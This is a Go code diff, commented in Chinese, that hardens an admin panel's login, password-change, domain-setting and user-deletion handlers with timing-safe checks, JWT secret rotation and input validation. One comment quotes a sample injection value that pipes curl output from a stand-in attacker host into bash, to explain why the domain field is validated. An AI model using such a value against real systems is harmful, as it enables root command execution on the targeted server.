@@ -29,10 +29,19 @@ import (
 
 // RandomToken 生成随机 Token 字符串
 func RandomToken(length int) string {
+	if length <= 0 {
+		length = 16
+	}
 	b := make([]byte, length)
-	rand.Read(b)
+	if _, err := rand.Read(b); err != nil {
+		// 极端情况下 (内核熵源异常) 退回 UUID, 绝不允许返回全 0 的低熵令牌
+		return strings.ReplaceAll(uuid.NewString(), "-", "")
+	}
 	return hex.EncodeToString(b)
 }
+
+// dummyBcryptHash 仅用于让"账号不存在"分支也付出同等 bcrypt 计算开销 (防时序枚举)
+const dummyBcryptHash = "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
 
 // LoginRequest 登录请求载荷
 type LoginRequest struct {
@@ -63,6 +72,8 @@ func HandleLogin(c *gin.Context) {
 	// 2. 数据库检索管理员
 	var admin model.Admin
 	if err := model.DB.Where("username = ?", req.Username).First(&admin).Error; err != nil {
+		// 即使账号不存在也执行一次等价开销的 bcrypt 比对, 避免通过响应耗时枚举管理员账号
+		_ = bcrypt.CompareHashAndPassword([]byte(dummyBcryptHash), []byte(req.Password))
 		middleware.GlobalLoginLimiter.RecordFailure(clientIP)
 		c.JSON(http.StatusUnauthorized, gin.H{"error": "用户名或密码错误"})
 		return
@@ -143,8 +154,18 @@ func HandleChangePassword(c *gin.Context) {
 		return
 	}
 
-	model.DB.Model(&admin).Update("password_hash", string(newHash))
-	c.JSON(http.StatusOK, gin.H{"message": "密码修改成功"})
+	if err := model.DB.Model(&admin).Update("password_hash", string(newHash)).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存新密码失败: " + err.Error()})
+		return
+	}
+
+	// 安全: 轮换 JWT 密钥, 使所有已签发的旧令牌立即失效 (否则被盗令牌可继续用到过期)
+	newSecret := RandomToken(32)
+	if err := model.SetSetting("jwt_secret", newSecret); err == nil {
+		middleware.SetJWTSecret(newSecret)
+	}
+
+	c.JSON(http.StatusOK, gin.H{"message": "密码修改成功，请使用新密码重新登录", "relogin": true})
 }
 
 // HandleGetSafeEntrance 获取当前安全入口状态与完整 URL (含域名模式)
@@ -209,6 +230,12 @@ func HandleSetSafeEntrance(c *gin.Context) {
 		cleanDomain = strings.TrimPrefix(cleanDomain, "http://")
 		cleanDomain = strings.TrimPrefix(cleanDomain, "https://")
 		cleanDomain = strings.TrimRight(cleanDomain, "/")
+		// 安全: 域名会被写进免鉴权的 /install.sh (root 执行), 必须严格校验字符集,
+		// 否则 `evil.com";curl attacker|bash;#` 这类值会变成存储型命令注入。
+		if !hostOnlyRe.MatchString(cleanDomain) {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "域名格式不合法 (只允许字母/数字/点/横线, 可带端口)"})
+			return
+		}
 		_ = model.SetSetting("master_domain", cleanDomain)
 	}
 
@@ -620,9 +647,14 @@ func HandleUpdateUser(c *gin.Context) {
 func HandleDeleteUser(c *gin.Context) {
 	id, _ := strconv.Atoi(c.Param("id"))
 	var user model.User
-	if err := model.DB.First(&user, id).Error; err == nil {
-		hub.GlobalHub.BroadcastCutoffUser(user.UUID)
-		model.DB.Delete(&user)
+	if err := model.DB.First(&user, id).Error; err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "用户不存在"})
+		return
+	}
+	hub.GlobalHub.BroadcastCutoffUser(user.UUID)
+	if err := model.DB.Delete(&user).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "删除失败: " + err.Error()})
+		return
 	}
 	c.JSON(http.StatusOK, gin.H{"message": "删除成功"})
 }
